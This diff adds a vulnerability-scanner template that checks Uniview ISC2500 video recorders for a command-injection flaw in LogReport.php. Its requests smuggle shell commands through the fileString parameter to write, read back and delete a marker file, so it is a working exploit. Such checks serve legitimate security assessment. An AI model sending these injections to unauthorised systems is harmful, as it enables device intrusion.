@@ -1,0 +1,37 @@
+id: uniview-isc2500-logreport-php-rce
+info:
+  name: Uniview ISC2500 LogReport PHP RCE
+  author: xiaobaicai
+  severity: critical
+  description: |
+    Exploits a remote command execution vulnerability in Uniview ISC2500 LogReport.php by performing arbitrary file creation and cleanup.
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80%20%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA%20ISC%20LogReport.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+variables:
+  s1: "{{rand_text_alpha(5)}}"
+  s2: "{{rand_text_alpha(20)}}"
+http:
+  - id: r1
+    method: GET
+    path:
+      - "/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;echo%20{{s2}}>{{s1}}.txt"
+    matchers:
+      - type: status
+        status:
+          - 200
+  - id: r2
+    method: GET
+    path:
+      - "/Interface/LogReport/{{s1}}.txt"
+    matchers:
+      - type: word
+        words:
+          - "{{s2}}"
+  - id: r3
+    method: GET
+    path:
+      - "/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;rm%20-f%20{{s1}}.txt"
+    matchers:
+      - type: status
+        status:
+          - 200
